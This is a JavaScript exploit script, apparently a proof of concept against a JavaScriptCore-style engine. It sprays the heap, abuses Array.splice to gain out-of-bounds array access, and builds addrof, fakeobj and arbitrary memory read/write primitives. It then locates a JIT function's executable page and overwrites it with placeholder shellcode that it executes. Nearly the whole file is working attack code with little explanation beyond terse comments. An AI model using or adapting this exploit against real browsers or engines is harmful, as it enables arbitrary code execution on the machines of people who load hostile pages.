var _dview = null;

function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0,hi);
    _dview.setUint32(4,low);
    return _dview.getFloat64(0);
}

function d2u(d) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setFloat64(0,d);
    return [_dview.getUint32(4), _dview.getUint32(0)];
}


function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }

    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }

    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}

const ITERATIONS = 100000;

function jitCompile(f, ...args) {
    for (var i = 0; i < ITERATIONS; i++) {
        f(...args);
    }
}

jitCompile(function dummy() { return 42; });

function makeJITCompiledFunction() {
    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return "ffff";
            }
        }
        return "tttt";
    }
    jitCompile(target, 123);

    return target;
}


function pwn() {
	let spray = [];
	for(let i = 0; i < 0x1000; i += 3) {
    	spray[i]   = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 0.37+i];
    	spray[i + 1] = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}];
    	spray[i + 2] = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 0.37+i];
	}

	for(let i = 0x2000; i < 0x3000; i += 3) {
		spray[i] = null;
	}

	gc();

	let arr = [1.1];
	// make arr -> ArrayStorage
	arr.length = 0x100000;

	// m_numValuesInVector == arr.length -> hasHoles() returns false
	arr.splice(0, 0x11);
	arr.length = 0xfffffff0;

	//arr.splice(1000, 0, 1,1,1,1,1,1,1,1);
	arr.splice(1000, 1, 1, 1);

	let idx = 0;
	for(let i = 0xc00; i < 0x1000; i++) {
		if (spray[i].length != 10) {
			idx = i;
			break;
		}
	}
	print(spray[idx].length);
	//spray[idx].length = 0x1000;
	//spray[idx + 2].length = 0x1000;

	let oob_unboxed = spray[idx];
	let oob_boxed = spray[idx + 2];

	// 0 -> unboxed double array's index 28
	// 1 -> unboxed double array's index 29
	oob_boxed[0] = {};

	// spray structure to arbitrary memroy read/write

	let storage = [];
    for(let i = 0; i < 0x2000; i++) {
        let a = [13.37];
        a.pointer = u2d(0xdadadada, 0xfafafafa);
        a["a" + i] = 1.1;
        storage.push(a);
    }
    let victim = storage[0x800];

	let template = {
		JSCell: u2d(0x1000, 0x01082007 - 0x10000),
		butterfly: victim
	};

	let memory = {
		addrof: function(obj) {
			oob_boxed[0] = obj;
			return oob_unboxed[28];
		},

		fakeobj: function(objaddr_lo, objaddr_hi) {
			oob_unboxed[28] = u2d(objaddr_lo, objaddr_hi);
			return oob_boxed[0];
		}
	};

	let template_addr = d2u(memory.addrof(template));
	print("template addr : " + hex(template_addr[0], template_addr[1]));

	let func = makeJITCompiledFunction();
	let func_addr = d2u(memory.addrof(func));
	print("jit func addr : " + hex(func_addr[0], func_addr[1]));

	let fake = memory.fakeobj(template_addr[0] + 0x10, template_addr[1]);
	let jscell = fake.pointer;
	let jscell_addr = d2u(jscell);

	print("jsCell : " + hex(jscell_addr[0], jscell_addr[1]));
	template.JSCell = u2d(jscell_addr[0], jscell_addr[1] - 0x10000);

	memory = {
		addrof: function(obj) {
			oob_boxed[0] = obj;
			return oob_unboxed[28];
		},

		fakeobj: function(objaddr_lo, objaddr_hi) {
			oob_unboxed[28] = u2d(objaddr_lo, objaddr_hi);
			return oob_boxed[0];
		},

		read64: function(addr) {
			// set fake butterfly
			// need to add 0x10 -> .pointer property offset in butterfly
			fake[1] = addr;
			return this.addrof(victim.pointer);
		},

		write64: function(addr, value) {
			// set fake butterfly
			// need to add 0x10 -> .pointer property offset in butterfly
			fake[1] = addr;
			victim.pointer = value;
		}
	};

	let jit_object = memory.read64(u2d(func_addr[0] + 0x10 + 0x18, func_addr[1]));
	let jit_object_addr = d2u(jit_object);
	print("jit object addr : " + hex(jit_object_addr[0], jit_object_addr[1]));

	let rwx_page = memory.read64(u2d(jit_object_addr[0] + 0x10 + 0x18, jit_object_addr[1]));
	let rwx_page_addr = d2u(rwx_page);
	print("rwx page addr : " + hex(rwx_page_addr[0], rwx_page_addr[1]));

	for(let i = 0; i < 0x400; i++) {
		memory.write64(
			u2d(rwx_page_addr[0] - 1 + (i * 8), rwx_page_addr[1]),
			u2d(0xcccccccc, 0xcccccccc - 0x10000)
		);
	}

	func(10);
}

pwn();
